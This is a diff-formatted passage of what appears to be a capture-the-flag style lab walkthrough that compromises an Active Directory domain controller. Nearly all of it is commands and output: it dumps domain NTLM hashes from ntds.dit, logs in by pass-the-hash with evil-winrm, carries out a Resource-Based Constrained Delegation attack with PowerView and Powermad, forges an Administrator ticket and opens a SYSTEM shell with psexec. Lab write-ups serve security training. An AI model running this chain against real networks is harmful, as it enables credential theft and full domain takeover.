+  .                                   D        0  Tue Oct  5 10:49:16 2021
+  ..                                  D        0  Tue Oct  5 10:49:16 2021
+  SECURITY                            A    65536  Mon Sep 27 12:45:20 2021
+  SYSTEM                              A 16777216  Mon Sep 27 12:45:20 2021
+
+                7706623 blocks of size 4096. 2686941 blocks available
+smb: \registry\> get SYSTEM 
+getting file \registry\SYSTEM of size 16777216 as SYSTEM (2516.4 KiloBytes/sec) (average 1916.8 KiloBytes/sec)
+smb: \registry\> get SECURITY 
+getting file \registry\SECURITY of size 65536 as SECURITY (372.1 KiloBytes/sec) (average 1904.5 KiloBytes/sec)
+smb: \registry\> exit
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/resourced]
+└─$ ls                                                           
+SECURITY  SYSTEM  ntds.dit  ntds.jfm  user.txt  windapsearch
+
+#I extrated the data from the ntds.dit file
+
+┌──(kali㉿kali)-[~/resourced]
+└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
+M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
+K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
+L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
+J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
+V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
+S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
+P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
+R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
+D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
+G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
+
+
+#I sprayed the dumped hashes among the users and found I have access to the machine as L.Livingstone via winrm
+
+#Bloodhound also showed that the user has access Generic All permission on the DC
+
+This https://bloodhound.specterops.io/resources/edges/generic-all helped, I performed a Resource-Based Constrained Delegation attack.
+
+                                                                                                                                                                                                                                                                                                                                                                                              
+┌──(kali㉿kali)-[~/resourced]
+└─$ evil-winrm -i 192.168.131.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> cd ..
+*Evil-WinRM* PS C:\Users\L.Livingstone> ls
+
+
+    Directory: C:\Users\L.Livingstone
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        10/1/2021   4:15 AM                Desktop
+d-r---        10/1/2021   4:15 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\L.Livingstone> upload PowerView.ps1
+                                        
+Info: Uploading /home/kali/resourced/PowerView.ps1 to C:\Users\L.Livingstone\PowerView.ps1
+                                        
+Data: 1027036 bytes of 1027036 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\L.Livingstone> upload Powermad.ps1
+                                        
+Info: Uploading /home/kali/resourced/Powermad.ps1 to C:\Users\L.Livingstone\Powermad.ps1
+                                        
+Data: 180768 bytes of 180768 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\L.Livingstone> import-module .\Powermad.ps1
+*Evil-WinRM* PS C:\Users\L.Livingstone> upload Rubeus.exe
+                                        
+Info: Uploading /home/kali/resourced/Rubeus.exe to C:\Users\L.Livingstone\Rubeus.exe
+                                        
+Data: 595968 bytes of 595968 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\L.Livingstone> import-module .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\L.Livingstone> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+[+] Machine account attackersystem added
+*Evil-WinRM* PS C:\Users\L.Livingstone> $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+*Evil-WinRM* PS C:\Users\L.Livingstone> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+ 
+*Evil-WinRM* PS C:\Users\L.Livingstone> $SDBytes = New-Object byte[] ($SD.BinaryLength)
+*Evil-WinRM* PS C:\Users\L.Livingstone> $SD.GetBinaryForm($SDBytes, 0)
+*Evil-WinRM* PS C:\Users\L.Livingstone> Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+ 
+#After adding the new computer and giving the computer 'msds-allowedtoactonbehalfofotheridentity' permission. I went back to my kali and used the computer to impersonate the domain administrator.
+
+┌──(kali㉿kali)-[~/resourced]
+└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attackersystem:'Summer2018!' -impersonate Administrator -dc-ip 192.168.131.175
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/resourced]
+└─$ ls
+20250624171023_bloodhound.zip                                         PowerView.ps1  PsExec.exe  SECURITY  atexec.py  hash.txt  ntds.dit  pass.txt   user.txt
+Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache  Powermad.ps1   Rubeus.exe  SYSTEM    dump.py    laps.py   ntds.jfm  psexec.py  windapsearch
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/resourced]
+└─$ export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/resourced]
+└─$ sudo sh -c 'echo "192.168.146.175 resourcedc.resourced.local" >> /etc/hosts'
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/resourced]
+└─$ sudo nano /etc/hosts                                                        
+
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/resourced]
+└─$ sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.131.175
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on resourcedc.resourced.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file pYrhdMKv.exe
+[*] Opening SVCManager on resourcedc.resourced.local.....
+[*] Creating service UuyP on resourcedc.resourced.local.....
+[*] Starting service UuyP.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2145]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> hostname
+ResourceDC
+
+C:\Windows\system32> cd C:\users
+ 
+C:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5C30-DCD7
+
+ Directory of C:\Users\Administrator\Desktop
+
+10/01/2021  04:28 AM    <DIR>          .
+10/01/2021  04:28 AM    <DIR>          ..
+06/26/2025  01:15 AM                34 proof.txt
+               1 File(s)             34 bytes
+               2 Dir(s)  11,133,132,800 bytes free
+
+C:\Users\Administrator\Desktop> type proof.txt
+13d23404377bf54f5b4b4ffbe293bbf0
+
